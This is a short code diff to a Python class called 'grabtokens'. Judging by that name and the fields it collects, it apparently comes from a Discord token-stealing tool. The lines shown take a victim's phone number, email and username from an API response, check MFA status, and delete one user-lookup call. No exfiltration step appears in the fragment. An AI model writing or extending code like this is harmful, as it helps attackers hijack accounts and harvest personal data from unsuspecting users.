@@ -273,10 +273,7 @@ class grabtokens():
             phone = r.json()['phone']
             email = r.json()['email']
 
-            myaccount = token.get_user(discord_id)
-
             val_name += f'{username}'
-
 
             try:
                 if r.json()['mfa_enabled']:
